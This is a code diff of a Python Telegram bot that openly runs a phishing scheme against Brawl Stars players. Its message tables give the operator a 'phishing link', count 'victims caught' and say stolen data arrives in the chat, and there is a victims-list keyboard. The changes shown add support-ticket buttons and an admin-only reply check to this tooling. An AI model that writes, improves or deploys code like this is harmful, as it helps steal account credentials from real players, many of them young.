@@ -14,7 +14,7 @@ user_language = {}
 tickets = {}
 admin_reply_context = {}
 
-# ========== ТЕКСТЫ (Без изменений) ==========
+# ========== ТЕКСТЫ (сокращённо, но можно полные) ==========
 TEXTS = {
     'ru': {
         'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
@@ -45,11 +45,14 @@ TEXTS = {
         'btn_settings': "⚙️ Настройки",
         'btn_back': "🔙 Назад",
         'btn_support': "📩 Поддержка",
+        'btn_close': "❌ Закрыть тикет",
+        'btn_reply': "✏️ Ответить",
         'btn_donate_25': "⭐ 25 звёзд",
         'btn_donate_50': "⭐ 50 звёзд",
         'btn_donate_100': "⭐ 100 звёзд",
         'btn_lang_ru': "🇷🇺 Русский",
-        'btn_lang_en': "🇬🇧 English"
+        'btn_lang_en': "🇬🇧 English",
+        'only_admin': "❌ Только администратор может отвечать на тикеты."
     },
     'en': {
         'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Phishing link:**\n`{url}`\n\n👨‍💼 **Victims caught:** {count}\n\n📌 Send the link to victim — data will come here.",
@@ -80,11 +83,14 @@ TEXTS = {
         'btn_settings': "⚙️ Settings",
         'btn_back': "🔙 Back",
         'btn_support': "📩 Support",
+        'btn_close': "❌ Close ticket",
+        'btn_reply': "✏️ Reply",
         'btn_donate_25': "⭐ 25 stars",
         'btn_donate_50': "⭐ 50 stars",
         'btn_donate_100': "⭐ 100 stars",
         'btn_lang_ru': "🇷🇺 Русский",
-        'btn_lang_en': "🇬🇧 English"
+        'btn_lang_en': "🇬🇧 English",
+        'only_admin': "❌ Only admin can reply to tickets."
     }
 }
 
@@ -152,7 +158,7 @@ def get_donate_keyboard(chat_id):
     ]
 
 def get_ticket_keyboard(chat_id, ticket_id):
-    return [[{"text": get_button_text(chat_id, 'btn_back'), "callback_data": f"close_ticket_{ticket_id}"}]]
+    return [[{"text": get_button_text(chat_id, 'btn_close'), "callback_data": f"close_ticket_{ticket_id}"}]]
 
 def get_victims_keyboard(chat_id, victims_list):
     keyboard = []
@@ -163,7 +169,7 @@ def get_victims_keyboard(chat_id, victims_list):
     return keyboard
 
 def get_admin_reply_keyboard(user_id, username, ticket_id):
-    return [[{"text": get_button_text(ADMIN_ID, 'btn_back'), "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]
+    return [[{"text": get_button_text(ADMIN_ID, 'btn_reply'), "callback_data": f"admin_reply_{user_id}_{username}_{ticket_id}"}]]
 
 def generate_ticket_id():
     return int(time.time()) % 1000000
@@ -182,7 +188,7 @@ def close_ticket(user_id):
 def get_active_ticket(user_id):
     return tickets.get(user_id) if tickets.get(user_id, {}).get("active") else None
 
-print("✅ Бот запущен на Render!")
+print("✅ Бот запущен на Render! Только @NeresVoid может отвечать на тикеты.")
 
 while True:
     try:
@@ -245,6 +251,10 @@ while True:
                         edit_message(chat_id, message_id, get_text(chat_id, 'ticket_closed'), get_main_keyboard(chat_id))
                 
                 elif data.startswith("admin_reply_"):
+                    if chat_id != ADMIN_ID:
+                        send_message(chat_id, get_text(chat_id, 'only_admin'))
+                        answer_callback(callback_id)
+                        continue
                     parts = data.split("_")
                     admin_reply_context[chat_id] = {"waiting_reply": True, "user_id": int(parts[2]), "username": parts[3], "ticket_id": int(parts[4])}
                     send_message(chat_id, get_text(chat_id, 'admin_reply_instruction', username=parts[3]))
